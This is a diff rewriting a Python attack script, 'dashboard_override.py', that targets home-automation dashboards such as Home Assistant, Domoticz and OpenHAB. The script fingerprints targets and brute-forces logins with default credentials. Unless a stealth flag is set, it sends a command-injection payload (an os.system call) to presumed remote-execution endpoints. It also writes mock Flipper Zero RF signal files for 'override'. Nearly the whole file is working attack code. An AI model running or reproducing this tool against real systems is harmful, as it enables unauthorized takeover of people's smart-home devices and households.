@@ -1,103 +1,126 @@
 #!/usr/bin/env python3
-# dashboard_override.py – Unified Stealth/Real IoT Override
-
 import requests
-import argparse
 import time
+import argparse
 import os
 from datetime import datetime
 
-# === Configuration ===
-DEFAULT_CREDENTIALS = [('admin', 'admin'), ('root', 'toor'), ('user', 'user')]
-CVE_PATHS = ['/api/config/script', '/system/exec', '/cgi-bin/rce.cgi']
-HEADERS = {'User-Agent': 'REDoT-Agent/1.0'}
+# Recon file and RF export path
+RECON_FILE = "recon/dashboard_targets.txt"
+RF_EXPORT_DIR = "exports_rf"
+COMMON_CREDS = [('admin', 'admin'), ('admin', 'password'), ('root', 'toor')]
+CVE_PAYLOAD = {"script": "os.system('touch /tmp/pwned')"}
 
-# === Target List ===
-TARGETS = [
-    'http://192.168.1.100:8123',
-    'http://192.168.1.101:8080',
-]
+# Simulated RF .sub content
+RF_SUB_MOCK = """
+Filetype: Flipper SubGhz RAW File
+Version: 1
+Frequency: 433920000
+Protocol: RAW
+RAW_Data: 310,320,-305,315,...
+"""
 
-# === Argument Parsing ===
-parser = argparse.ArgumentParser(description='IoT Dashboard Override Attack Module')
-parser.add_argument('--stealth', action='store_true', help='Run in stealth (simulated) mode')
-parser.add_argument('--targets', type=str, help='File with target URLs (one per line)')
-args = parser.parse_args()
+# Known dashboard fingerprints
+def fingerprint_dashboard(ip):
+    try:
+        r = requests.get(f"http://{ip}", timeout=4)
+        banner = r.text.lower()
+        if "home assistant" in banner:
+            return "Home Assistant"
+        elif "domoticz" in banner:
+            return "Domoticz"
+        elif "openhab" in banner:
+            return "OpenHAB"
+        return "Unknown"
+    except:
+        return "Unreachable"
 
-if args.targets and os.path.exists(args.targets):
-    with open(args.targets, 'r') as f:
-        TARGETS = [line.strip() for line in f if line.strip()]
+# Brute-force login simulation
+def attempt_login(ip):
+    for user, pwd in COMMON_CREDS:
+        try:
+            r = requests.post(f"http://{ip}/login", data={'username': user, 'password': pwd}, timeout=3)
+            if "dashboard" in r.text.lower() or r.status_code == 200:
+                return (user, pwd)
+        except:
+            continue
+    return None
 
-timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
-log_file = f"logs/dashboard_override_{timestamp}.log"
-os.makedirs("logs", exist_ok=True)
+# CVE Payload injector
+def exploit_dashboard(ip, stealth):
+    if stealth:
+        print(f"[*] [SIM] Would send CVE payload to {ip}")
+        return True
+    try:
+        r = requests.post(f"http://{ip}/api/config/script", json=CVE_PAYLOAD, timeout=3)
+        return r.status_code == 200
+    except:
+        return False
 
-# === Logger ===
-def log(msg):
-    print(msg)
-    with open(log_file, 'a') as f:
-        f.write(msg + '\n')
+# Flipper .sub file writer
+def export_rf_signal(ip):
+    os.makedirs(RF_EXPORT_DIR, exist_ok=True)
+    fname = f"{RF_EXPORT_DIR}/inject_{ip.replace('.', '_')}.sub"
+    with open(fname, 'w') as f:
+        f.write(RF_SUB_MOCK)
+    return fname
 
-# === Simulated Mode ===
-def stealth_mode():
-    log("Dashboard Override Module [STEALTH MODE]")
-    for url in TARGETS:
-        log(f"\n[+] Probing {url}...")
-        time.sleep(0.5)
-        log("    -> Attempting default login (admin:admin)... [SIM FAIL]")
-        time.sleep(0.5)
-        log("    -> Attempting CVE exploit for remote command injection... [SIM SUCCESS]")
-        log(f"    -> Injected rogue automation: 'Turn off lights every 5 sec' at {url}")
-    log("\n[✓] Stealth simulation complete.")
+# Target selection
+def get_targets(manual=False):
+    if manual or not os.path.exists(RECON_FILE):
+        ip = input("Enter dashboard IP or URL manually: ").strip()
+        return [ip]
+    else:
+        print("[*] Found recon results:")
+        with open(RECON_FILE) as f:
+            targets = [line.strip() for line in f if line.strip()]
+        for i, t in enumerate(targets):
+            print(f"  [{i+1}] {t}")
+        choice = input("Select number or press Enter for all: ")
+        if choice.isdigit():
+            return [targets[int(choice)-1]]
+        return targets
 
-# === Real Attack Mode ===
-def real_mode():
-    log("Dashboard Override Module [REAL ATTACK MODE]")
-    for url in TARGETS:
-        log(f"\n[+] Probing {url}...")
-        success = False
-        for user, pwd in DEFAULT_CREDENTIALS:
-            try:
-                resp = requests.post(f"{url}/login", data={'username': user, 'password': pwd}, headers=HEADERS, timeout=5)
-                if resp.status_code in [200, 302]:
-                    log(f"    -> Login success with {user}:{pwd}")
-                    success = True
-                    break
-                else:
-                    log(f"    -> Login failed with {user}:{pwd}")
-            except Exception as e:
-                log(f"    -> Error connecting: {e}")
+def main():
+    parser = argparse.ArgumentParser(description="Dashboard Override - Real or Stealth mode")
+    parser.add_argument('--stealth', action='store_true', help="Enable stealth simulation mode")
+    parser.add_argument('--manual', action='store_true', help="Manually input target(s)")
+    args = parser.parse_args()
 
-        for path in CVE_PATHS:
-            try:
-                payload_url = f"{url}{path}"
-                payload = {"script": "automation.turn_off_all_lights()"}
-                resp = requests.post(payload_url, json=payload, headers=HEADERS, timeout=5)
-                if resp.status_code == 200:
-                    log(f"    -> Exploit delivered at {payload_url}")
-                    log(f"    -> Injected automation at {url}")
-                    success = True
-                    break
-            except Exception as e:
-                log(f"    -> Exploit error: {e}")
+    targets = get_targets(args.manual)
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    log_file = f"results/dashboard_override_{timestamp}.log"
+    os.makedirs("results", exist_ok=True)
 
-        if success:
-            export_flipper_sub(url)
+    with open(log_file, 'w') as log:
+        for ip in targets:
+            print(f"\n[+] Target: {ip}")
+            log.write(f"\n[+] Target: {ip}\n")
 
-    log("\n[✓] Real attack execution complete. Logs saved.")
+            dashboard_type = fingerprint_dashboard(ip)
+            print(f"    -> Fingerprint: {dashboard_type}")
+            log.write(f"    -> Fingerprint: {dashboard_type}\n")
 
-# === Optional RF Export for Flipper ===
-def export_flipper_sub(url):
-    safe_name = url.replace("http://", "").replace(":", "_")
-    filename = f"flipper_exports/{safe_name}.sub"
-    os.makedirs("flipper_exports", exist_ok=True)
-    with open(filename, 'w') as f:
-        f.write("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: 433920000\n")
-        f.write("RAW_Data: 112,452,-133,130,... [TRUNCATED]\n")
-    log(f"    -> RF override exported for Flipper: {filename}")
+            creds = attempt_login(ip)
+            if creds:
+                print(f"    -> Login success with {creds[0]}:{creds[1]}")
+                log.write(f"    -> Login: {creds[0]}:{creds[1]}\n")
+            else:
+                print("    -> Login failed with common credentials")
+                log.write("    -> Login failed\n")
 
-# === Execute ===
-if args.stealth:
-    stealth_mode()
-else:
-    real_mode()
+            if exploit_dashboard(ip, args.stealth):
+                print("    -> Exploit success (payload delivered)")
+                log.write("    -> Exploit success\n")
+            else:
+                print("    -> Exploit failed")
+                log.write("    -> Exploit failed\n")
+
+            rf_path = export_rf_signal(ip)
+            print(f"    -> RF signal exported to {rf_path}")
+            log.write(f"    -> RF signal: {rf_path}\n")
+
+    print(f"\n[+] Dashboard override process complete. Log saved to {log_file}")
+
+if __name__ == "__main__":
+    main()
